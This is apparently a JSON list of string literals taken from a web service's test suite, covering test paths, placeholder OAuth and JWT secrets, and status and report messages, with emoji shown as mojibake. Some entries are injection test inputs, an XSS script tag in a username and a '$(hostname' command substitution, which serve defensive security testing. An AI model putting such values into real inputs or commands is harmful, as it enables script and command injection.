    "test_.*_real_llm|real_llm_test_|with_real_llm|@real_llm|@pytest\\.mark\\.real_llm",
    "test_.*_security|security_test_|TestSecurity",
    "test_.*_unit|unit_test_|TestUnit",
    "test_access_token",
    "test_agent",
    "test_auth_code_",
    "test_auth_code_123",
    "test_auth_code_12345",
    "test_backend",
    "test_categories.py",
    "test_categorization.json",
    "test_challenge",
    "test_client_id",
    "test_client_secret",
    "test_code",
    "test_code_",
    "test_code_for_availability_check",
    "test_code_manager1",
    "test_code_manager2",
    "test_config.py",
    "test_configs",
    "test_connection",
    "test_count",
    "test_details",
    "test_dir",
    "test_directories",
    "test_discovery.py",
    "test_env",
    "test_failures",
    "test_file",
    "test_file_size",
    "test_fix_results_",
    "test_framework",
    "test_framework.test_runner",
    "test_framework_size",
    "test_frameworks",
    "test_frontend",
    "test_function_complexity",
    "test_google_client_id",
    "test_google_client_secret",
    "test_history.json",
    "test_id_123",
    "test_integration",
    "test_interfaces",
    "test_jwt_secret_key_for_testing_purposes",
    "test_jwt_secret_key_for_validation_testing",
    "test_jwt_secret_key_that_is_long_enough_for_testing_purposes",
    "test_message",
    "test_methods",
    "test_metrics",
    "test_name",
    "test_overlap_report.json",
    "test_overlap_report.md",
    "test_pass",
    "test_password",
    "test_password_123",
    "test_priority",
    "test_realistic_data_integration.py",
    "test_refresh",
    "test_refresh_hash",
    "test_refresh_token",
    "test_report_",
    "test_reports",
    "test_reports/real_test_violations.json",
    "test_results",
    "test_results.json",
    "test_results_100_iterations.json",
    "test_run_123",
    "test_runner",
    "test_runner_frontend",
    "test_runner_nodetest",
    "test_runner_pytest",
    "test_runner_secrets",
    "test_runners",
    "test_secret",
    "test_secret_for_id_tokens",
    "test_service",
    "test_service_secret_key",
    "test_session",
    "test_session_",
    "test_session_123",
    "test_session_456",
    "test_session_collision",
    "test_session_expiry",
    "test_similarities.csv",
    "test_size_compliance_examples.py",
    "test_size_violations.json",
    "test_state",
    "test_status",
    "test_token",
    "test_token_hash",
    "test_type_distribution",
    "test_update_spec.xml",
    "test_user",
    "test_user_123",
    "test_user_creation.py (80 lines)\n- test_user_creation_valid_data()\n- test_user_creation_invalid_email()\n- test_user_creation_duplicate_email()\n\ntest_user_authentication.py (85 lines)  \n- test_authenticate_valid_credentials()\n- test_authenticate_invalid_password()\n- test_authenticate_nonexistent_user()\n\ntest_user_permissions.py (90 lines)\n- test_user_default_permissions()\n- test_admin_permissions()\n- test_permission_inheritance()\n\ntest_user_profile.py (70 lines)\n- test_profile_update()\n- test_profile_validation()\n- test_profile_privacy()\n\ntest_user_helpers.py (50 lines)\n- create_test_user()\n- create_admin_user()\n- get_test_auth_token()",
    "test_utils",
    "test_utils.py",
    "test_verifier",
    "test_violations_report.md",
    "testcontainers",
    "testing",
    "testpass",
    "tests",
    "tests\u001b[0m",
    "tests failed",
    "tests failed.",
    "tests passed",
    "tests passed (",
    "tests timed out after",
    "tests to test suite",
    "tests without validation",
    "tests)",
    "tests)\u001b[0m -",
    "tests) -",
    "tests, avg score:",
    "tests.e2e.",
    "tests/",
    "tests/**/*.py",
    "tests/**/*_test.py",
    "tests/conftest.py",
    "tests/e2e",
    "tests/integration/red_team/tier1_catastrophic/test_agent_lifecycle_management.py",
    "tests/integration/red_team/tier1_catastrophic/test_api_gateway_rate_limiting_accuracy.py",
    "tests/integration/red_team/tier1_catastrophic/test_cross_database_transaction_consistency.py",
    "tests/integration/red_team/tier1_catastrophic/test_database_migration_failure_recovery.py",
    "tests/integration/red_team/tier1_catastrophic/test_llm_service_integration.py",
    "tests/integration/red_team/tier1_catastrophic/test_message_persistence_and_retrieval.py",
    "tests/integration/red_team/tier1_catastrophic/test_oauth_database_consistency.py",
    "tests/integration/red_team/tier1_catastrophic/test_service_discovery_failure_cascades.py",
    "tests/integration/red_team/tier1_catastrophic/test_thread_crud_operations_data_consistency.py",
    "tests/integration/red_team/tier1_catastrophic/test_websocket_authentication_integration.py",
    "tests/integration/red_team/tier1_catastrophic/test_websocket_message_broadcasting.py",
    "tests/integration/red_team/tier2_major_failures/test_clickhouse_data_ingestion_pipeline.py",
    "tests/integration/red_team/tier2_major_failures/test_file_upload_and_storage.py",
    "tests/integration/red_team/tier2_major_failures/test_redis_session_store_consistency.py",
    "tests/integration/staging/test_staging_database_connection_resilience.py",
    "tests/integration/user_flows/test_conversion_paths.py",
    "tests/integration/user_flows/test_early_tier_flows.py",
    "tests/integration/user_flows/test_enterprise_flows.py",
    "tests/integration/user_flows/test_free_tier_onboarding.py",
    "tests/integration/user_flows/test_mid_tier_flows.py",
    "tests/test_example_message_flow.py",
    "tests/test_example_message_integration.py",
    "tests/test_super_e2e.py",
    "tests/test_system_startup.py",
    "tests:",
    "tests\\.unified\\.e2e\\.",
    "tests_passed",
    "testuser@example.com",
    "text",
    "third_party",
    "thorough",
    "threshold_based",
    "throughput",
    "throughput_rps",
    "tier",
    "tier customer data and access control",
    "tier functionality",
    "tier has insufficient test coverage",
    "tier_coverage",
    "time",
    "time.sleep",
    "time.time",
    "time_based",
    "time_utilities",
    "timed out",
    "timeout",
    "timeout expired",
    "timeout:test",
    "timeout_rate",
    "timestamp",
    "timing_test_service",
    "title",
    "to",
    "to <10 within 2 sprints",
    "to sync",
    "to_dict",
    "token",
    "token replacements in",
    "token1",
    "token123",
    "token_created",
    "token_exchange",
    "token_generation",
    "token_limit",
    "token_limits",
    "token_refresh",
    "token_refreshed",
    "token_revoked",
    "token_type",
    "token_validation",
    "token_validation_bypass",
    "too.few.parts",
    "too.many.parts.here.extra",
    "tool_dispatcher = Mock()",
    "tool_dispatcher = ToolDispatcher(llm_manager)",
    "top_100",
    "top_overlaps_by_category",
    "top_value_tests",
    "total",
    "total attempts",
    "total_agents",
    "total_business_value",
    "total_categories",
    "total_config_fixes",
    "total_cost",
    "total_costs_usd",
    "total_duration",
    "total_failures",
    "total_fake_tests",
    "total_file_fixes",
    "total_files",
    "total_files_scanned",
    "total_import_fixes",
    "total_iterations",
    "total_lines",
    "total_llm_cost",
    "total_methods",
    "total_requests",
    "total_similarity_pairs",
    "total_test_files",
    "total_test_functions",
    "total_tests",
    "total_tokens",
    "total_tracked_tests",
    "total_violations",
    "totals",
    "trace_id",
    "traceback",
    "traceparent",
    "tracestate",
    "traffic_data",
    "trigger",
    "trivial tests for refactoring",
    "true",
    "tsc",
    "typ",
    "type",
    "typescript",
    "ultra_fast",
    "unauthorized_client",
    "unauthorized_user",
    "unavailable",
    "unavailable-host",
    "unexpected keyword argument 'sslmode'",
    "unexpectedly found in database",
    "unhealthy",
    "unified",
    "unified_report.md",
    "unified_secret_789",
    "unified_test_runner.py",
    "unique_code_",
    "unit",
    "unittest",
    "unittest.TestCase",
    "unknown",
    "unknown_validation_type",
    "unmatched",
    "unrecognized",
    "unverified@example.com",
    "up",
    "update",
    "updated_at",
    "url",
    "url_type",
    "urllib.request.urlopen",
    "us-central1",
    "usage",
    "use_cached_tokens",
    "use_mocks",
    "used",
    "user",
    "user space@domain.com",
    "user-",
    "user-$(hostname",
    "user-123",
    "user-456",
    "user-789",
    "user-to-revoke",
    "user1",
    "user123",
    "user1@example.com",
    "user2",
    "user2@example.com",
    "user3@example.com",
    "user456",
    "user:email",
    "user:read_profile",
    "user:update_profile",
    "user@",
    "user@domain",
    "user@netrasystems.ai",
    "user_123",
    "user_agent",
    "user_authentication",
    "user_authentication_bypass",
    "user_cancelled_login",
    "user_exists",
    "user_facing_behavior",
    "user_flows",
    "user_id",
    "user_info",
    "user_initiated",
    "user_management",
    "user_not_found",
    "user_notification",
    "user_pr-4",
    "user_registration",
    "username",
    "uses_real_clickhouse",
    "uses_real_database",
    "uses_real_llm",
    "uses_real_redis",
    "using mock",
    "utf-8",
    "util",
    "utilities",
    "utils.py",
    "uvicorn",
    "valid",
    "valid-client-id.googleusercontent.com",
    "valid-client-secret",
    "valid-oauth-hmac-secret-32-chars",
    "valid-oauth-hmac-secret-32-chars-long",
    "valid-staging-client-id",
    "valid-staging-client-id-12345",
    "valid-staging-client-secret",
    "valid-staging-client-secret-67890",
    "valid.looking.but-actually-invalid-jwt-token",
    "valid1",
    "valid123",
    "valid@example.com",
    "valid_code_",
    "valid_code_for_reuse_",
    "valid_code_with_pkce_",
    "valid_google_token",
    "valid_secret",
    "valid_staging_config",
    "valid_token",
    "validate",
    "validate_auth_url",
    "validate_auth_url must be callable",
    "validate_auth_url should be callable",
    "validate_auth_url should return a boolean",
    "validate_auth_url should return boolean",
    "validate_auth_url should return boolean, got:",
    "validate_base_url",
    "validate_pkce_token_refresh",
    "validate_token",
    "validation_passed",
    "validation_test",
    "value",
    "value_",
    "value_score",
    "venv",
    "venv_test",
    "verbose",
    "verified",
    "verified_email",
    "verify",
    "verify_exp",
    "verify_signature",
    "version",
    "version: '3.8'\n\nservices:\n  postgres:\n    image: postgres:15-alpine\n    environment:\n      POSTGRES_USER: netra_test\n      POSTGRES_PASSWORD: test_password\n      POSTGRES_DB: netra_test\n    ports:\n      - \"5433:5432\"\n    healthcheck:\n      test: [\"CMD-SHELL\", \"pg_isready -U netra_test\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5\n\n  redis:\n    image: redis:7-alpine\n    ports:\n      - \"6380:6379\"\n    healthcheck:\n      test: [\"CMD\", \"redis-cli\", \"ping\"]\n      interval: 10s\n      timeout: 5s\n      retries: 5",
    "very",
    "very-long-email",
    "view",
    "violation_type",
    "violation_type_breakdown",
    "violations",
    "violations (dry_run=",
    "violations automatically.",
    "violations in",
    "violations remain after auto-fix:",
    "violations)",
    "violations):",
    "violations.",
    "vulnerability",
    "vulnerability-test",
    "w",
    "warning",
    "warnings",
    "warp-custom",
    "warp-custom-default=catthehacker/ubuntu:act-latest",
    "was cancelled",
    "weak password",
    "weak-secret",
    "weak_password",
    "web",
    "web_",
    "webpack",
    "websocket",
    "websocket_config",
    "websocket_connection",
    "websocket_manager",
    "websocket_manager = Mock()",
    "websocket_manager = UnifiedWebSocketManager()",
    "websocket_timeout",
    "websocket_url",
    "websockets library not installed - skipping WebSocket connection test",
    "websocket|WebSocket|ws://",
    "websocket|ws|realtime|socket",
    "weekend_multiplier",
    "when expecting",
    "widget",
    "win32",
    "with",
    "worker",
    "workers",
    "workflow",
    "workflow-test-report.json",
    "workflow_call",
    "workflow_verification_results.md",
    "workflow_verification_test_report.md",
    "workflows",
    "workflows to test",
    "workload",
    "workload_patterns",
    "workload_type",
    "workloads",
    "write",
    "wrong",
    "wrong connection name",
    "wrong-issuer",
    "wrong-secret-key",
    "wrong_password",
    "wrong_secret",
    "wrong_session_12345",
    "wrong_session_999",
    "wrong_verifier",
    "wrongpass",
    "ws",
    "ws://",
    "ws://localhost:",
    "ws://localhost:8000",
    "ws://localhost:8000/ws",
    "ws_url",
    "wss://api.staging.netrasystems.ai/ws",
    "wss://ws.staging.netra.ai",
    "x",
    "x (valid:",
    "xdist",
    "xss_payloads",
    "y",
    "year_end",
    "your-client-id.googleusercontent.com",
    "zinc",
    "{",
    "{\"sub\": \"user\", \"exp\": 1234567890, \"invalid\": json}",
    "|",
    "| $",
    "| Database | Queries | Avg Latency (ms) |",
    "| File | Function | Lines | Limit | Fix Suggestion |",
    "| File | Lines | Limit | Fix Suggestion |",
    "| Model | Calls | Estimated Cost |",
    "|----------|---------|------------------|",
    "|-------|-------|----------------|",
    "|------|----------|-------|-------|----------------|",
    "|------|-------|-------|----------------|",
    "|def",
    "}",
    "–ü–∞—Ä–æ–ª—å123!ÊµãËØï",
    "‚Ä¢",
    "‚Ä¢ For excessive_mocking violations: Use real components where possible",
    "‚Ä¢ For file_size violations: Split large test files into focused modules",
    "‚Ä¢ For function_size violations: Extract helper methods",
    "‚Ä¢ For mock_component violations: Replace with real component instantiation",
    "‚Ä¢ Run with --fix to attempt automatic fixes",
    "‚ÑπÔ∏è",
    "‚Üí",
    "‚Üî `",
    "‚è≠Ô∏è",
    "‚è≠Ô∏è SKIPPED",
    "‚è∞",
    "‚è∞ Test timed out",
    "‚è±Ô∏è STABILITY | Keeping services running for 5 seconds...",
    "‚è≥ Waiting for services to be healthy...",
    "‚ö†",
    "‚ö† Manual fix needed: Extract helpers in",
    "‚ö† Manual fix needed: Split",
    "‚ö† Needs manual review:",
    "‚ö† OAuth implementation not found in auth_routes.py",
    "‚ö†Ô∏è",
    "‚ö†Ô∏è  .secrets file not found. Creating with mock values...",
    "‚ö†Ô∏è  Exiting with warning due to",
    "‚ö†Ô∏è  Found",
    "‚ö†Ô∏è  Issues Found (",
    "‚ö†Ô∏è  Issues found in",
    "‚ö†Ô∏è  MEDIUM SEVERITY (",
    "‚ö†Ô∏è  NO TESTS WERE RUN",
    "‚ö†Ô∏è  Test timeout",
    "‚ö†Ô∏è  Validation timeout",
    "‚ö†Ô∏è HIGH: Address",
    "‚ö†Ô∏è MEDIUM",
    "‚ö†Ô∏è No model response received within timeout",
    "‚ö†Ô∏è SOME TESTS FAILED",
    "‚ö†Ô∏è Some tests failed. Please check the failures above.",
    "‚ö†Ô∏è WARNING | Auth service failed to start",
    "‚ö†Ô∏è WARNING | Auth system verification failed",
    "‚ö†Ô∏è WARNING | Backend readiness check failed",
    "‚ö†Ô∏è WARNING | Cleanup error:",
    "‚ö†Ô∏è WARNING | Migration issues, continuing...",
    "‚ö†Ô∏è WARNING | Secrets loading had issues, continuing...",
    "‚ö†Ô∏è Warning:",
    "‚ö° HIGH PRIORITY: Address",
    "‚úÖ",
    "‚úÖ  No fake tests detected - good job!",
    "‚úÖ ACT found:",
    "‚úÖ All E2E tests passed successfully!",
    "‚úÖ All auth service startup tests passed",
    "‚úÖ All imports successful",
    "‚úÖ All services are healthy",
    "‚úÖ All test files comply with real test requirements!",
    "‚úÖ All tests appear to be legitimate - no fake tests detected!",
    "‚úÖ All tests completed successfully!",
    "‚úÖ All tests comply with real test requirements!",
    "‚úÖ All tests passed!",
    "‚úÖ Auth service import resolution test passed",
    "‚úÖ Auth startup command structure test passed",
    "‚úÖ Authentication successful (user:",
    "‚úÖ Code injection attempts: HANDLED SAFELY",
    "‚úÖ Concurrent access attacks: BLOCKED",
    "‚úÖ Configuration validation passed",
    "‚úÖ Created .secrets file with mock values",
    "‚úÖ Docker found:",
    "‚úÖ Dry run successful",
    "‚úÖ Expiration handling: 10 MINUTES CONFIGURED",
    "‚úÖ Fixed and validated successfully",
    "‚úÖ Fixed circular env.ACT reference",
    "‚úÖ Graceful degradation with optional services",
    "‚úÖ Handler initialization successful",
    "‚úÖ Imports successful",
    "‚úÖ Initialization successful",
    "‚úÖ Memory store fallback: WORKING",
    "‚úÖ Message sent successfully",
    "‚úÖ Message validation successful",
    "‚úÖ Model response contains expected pattern:",
    "‚úÖ Multiple replay attempts: BLOCKED",
    "‚úÖ No fake tests detected! Codebase follows testing best practices.",
    "‚úÖ PASS",
    "‚úÖ PASSED",
    "‚úÖ Passed:",
    "‚úÖ Port allocation conflict prevention",
    "‚úÖ Race condition prevention: ATOMIC OPERATIONS",
    "‚úÖ Readiness vs health check separation",
    "‚úÖ Received model event:",
    "‚úÖ Redis integration: WORKING WITH FAILOVER",
    "‚úÖ STAGING TESTS PASSED",
    "‚úÖ SUCCESS | Auth service started",
    "‚úÖ SUCCESS | Auth system is ready",
    "‚úÖ SUCCESS | Backend is ready",
    "‚úÖ SUCCESS | Backend service started",
    "‚úÖ Service dependency ordering",
    "‚úÖ Service discovery timing issues",
    "‚úÖ Services started successfully",
    "‚úÖ Services stopped",
    "‚úÖ Simple replay attacks: BLOCKED",
    "‚úÖ Successfully fixed test_utils imports!",
    "‚úÖ Syntax valid",
    "‚úÖ TEST PASSED | Service startup orchestration test completed successfully in",
    "‚úÖ Test audit report generated:",
    "‚úÖ Thread created:",
    "‚úÖ WebSocket connection authenticated",
    "‚úì",
    "‚úì All components are implemented and working",
    "‚úì All files have correct import order!",
    "‚úì All syntax errors fixed!",
    "‚úì Anti-patterns to avoid",
    "‚úì Auth routes code compliance check passed",
    "‚úì Environment",
    "‚úì Environment set to 'staging'",
    "‚úì Examples and documentation provided",
    "‚úì File is compliant with size limits!",
    "‚úì File splitting strategies",
    "‚úì Fixed mock component function in",
    "‚úì Functions under 8 lines",
    "‚úì Health checks include OAuth configuration validation",
    "‚úì Helper method extraction",
    "‚úì Integration with test runner is complete",
    "‚úì No 'No token received' errors in logs",
    "‚úì No frontend URLs in OAuth configuration",
    "‚úì No redirect_uri_mismatch errors",
    "‚úì OAuth authentication monitoring enabled",
    "‚úì OAuth authentication success rate > 95%",
    "‚úì OAuth callback completion rate > 95%",
    "‚úì OAuth callback endpoint available:",
    "‚úì OAuth callback endpoint exists:",
    "‚úì OAuth callback endpoints exist and respond",
    "‚úì OAuth callback endpoints return non-404 responses",
    "‚úì OAuth error logging configured",
    "‚úì OAuth flow tested end-to-end in staging",
    "‚úì OAuth initiation endpoints return 302 redirects",
    "‚úì OAuth initiation redirect_uri:",
    "‚úì OAuth provider response times < 3s",
    "‚úì OAuth redirect URI validation passed:",
    "‚úì OAuth redirect URI validation:",
    "‚úì OAuth redirect URIs match Google Console configuration",
    "‚úì OAuth redirect URIs point to auth service URLs",
    "‚úì OAuth redirect chain validation complete",
    "‚úì OAuth state parameter format valid",
    "‚úì OAuth state parameter present (custom format)",
    "‚úì OAuth state parameter validation working",
    "‚úì OAuth token exchange functionality tested",
    "‚úì Parametrized tests",
    "‚úì Password has sufficient length",
    "‚úì Pre-run validation function is available",
    "‚úì Proper fixture usage",
    "‚úì Received response:",
    "‚úì Reduced mocking in",
    "‚úì Staging OAuth redirect URI validated:",
    "‚úì Test already passing",
    "‚úì Test size limits enforcement is fully functional",
    "‚úì This is the correct method for GCP Cloud Run",
    "‚úì Updated:",
    "‚úì Using Cloud SQL Unix socket connection",
    "‚úì Using standard 'postgres' user",
    "‚úì WebSocket connection established!",
    "‚úì WebSocket test passed!",
    "‚úó",
    "‚úó Connection refused:",
    "‚úó Environment not set to 'staging'",
    "‚úó Error getting database URL:",
    "‚úó Invalid status code:",
    "‚úó No password configured",
    "‚úó No response received within 5 seconds",
    "‚úó Not using Cloud SQL socket - this could be the issue",
    "‚úó Unexpected error:",
    "‚úó WebSocket test failed!",
    "‚ùå",
    "‚ùå (FAILING)",
    "‚ùå ACT not found. Please install ACT first.",
    "‚ùå Configuration error:",
    "‚ùå Docker not found or not running.",
    "‚ùå Dry run failed:",
    "‚ùå E2E test failed:",
    "‚ùå Error checking ACT:",
    "‚ùå Error checking Docker:",
    "‚ùå Error:",
    "‚ùå Exiting with error code due to",
    "‚ùå Exiting with error:",
    "‚ùå FAIL",
    "‚ùå FAILED",
    "‚ùå FAILED | Backend service failed to start",
    "‚ùå FAILED | Database validation failed",
    "‚ùå FAILED | Environment check failed",
    "‚ùå FAILED | No services started successfully",
    "‚ùå Failed Workflows:",
    "‚ùå Failed to fix",
    "‚ùå Failed:",
    "‚ùå Found",
    "‚ùå Handler initialization error:",
    "‚ùå Handler initialization failed",
    "‚ùå Import error:",
    "‚ùå Message validation error:",
    "‚ùå Message validation failed",
    "‚ùå Prerequisites check failed",
    "‚ùå Quick validation failed:",
    "‚ùå SOME TESTS FAILED",
    "‚ùå STAGING TESTS FAILED (exit code:",
    "‚ùå Services failed to become healthy within timeout",
    "‚ùå Some coordination fixes failed validation",
    "‚ùå Syntax error:",
    "‚ùå TEST FAILED | Service startup orchestration test failed after",
    "‚ùå Test error:",
    "‚ùå Test file not found:",
    "‚ùå Validation error:",
    "‚ùå WebSocket manager not available",
    "ÊµãËØïÁî®Êà∑ üöÄ <script>alert('xss')</script>",
    "üéâ ALL COORDINATION FIXES VALIDATED SUCCESSFULLY!",
    "üéâ ALL TESTS PASSED!",
    "üéâ All tests passed! Staging environment is fully operational.",
    "üéâ All tests passing after",
    "üéâ Quick validation passed!",
    "üéØ Focus on testing real business logic, not mocks or constants",
    "üéØ PHASE 6 | Testing service readiness...",
    "üèÅ TESTING COMPLETE | Service startup orchestration test finished",
    "üí° *",
    "üí° Suggested fixes:",
    "üí° To fix these issues:",
    "üí•",
    "üí• ERROR | Test failed with exception:",
    "üí• Error running",
    "üí¨ Testing chat message flow...",
    "üíæ PHASE 3 | Database validation...",
    "üíæ Report saved to:",
    "üíæ Saved fixes to",
    "üìÅ",
    "üìÑ JSON report saved to:",
    "üìà **Success Metric:** Reduce violations from",
    "üìà DETAILED METRICS",
    "üìä Found",
    "üìä Summary:",
    "üìä TEST RESULTS SUMMARY",
    "üìã MEDIUM: Schedule",
    "üìã PHASE 1 | Environment and pre-checks...",
    "üìã Running",
    "üìã Test Report",
    "üìç Line",
    "üìñ Review SPEC/testing.xml for detailed fake test guidance",
    "üìö Use patterns from app/tests/examples/test_real_functionality_examples.py",
    "üìù Validating syntax:",
    "üì¶ Starting services with dev launcher...",
    "üîÑ PHASE 4 | Migration check...",
    "üîå Testing WebSocket connection...",
    "üîç Add fake test detection to CI pipeline to prevent regressions",
    "üîç Checking prerequisites...",
    "üîç Running Quick Validation Checks",
    "üîç Running Validation Checks",
    "üîê PHASE 2 | Loading secrets...",
    "üîê SECURITY ASSESSMENT: ROBUST - All major attack vectors are properly mitigated",
    "üîê Testing authentication...",
    "üî•",
    "üî• **",
    "üî• HIGH",
    "üî• URGENT: Fix",
    "üîß Action:",
    "üîß Attempting to fix issues in:",
    "üîß LOW: Consider consolidating",
    "üî¥",
    "üöÄ PHASE 5 | Starting services...",
    "üöÄ Starting Cold Start E2E Test Suite",
    "üöÄ Starting Example Message Flow Test Suite",
    "üöÄ Starting GitHub Workflows Testing with ACT",
    "üö®",
    "üö® CRITICAL: Remove",
    "üö® HIGH SEVERITY (",
    "üõ°Ô∏è OAuth Authorization Code Reuse Prevention - Security Analysis Complete",
    "üü°",
    "üü¢",
    "ü§ñ Testing model response...",
    "üß™ Testing workflow:",
    "üßπ CLEANUP | Shutting down services...",
    "üßπ Cleaning up..."
  ]
}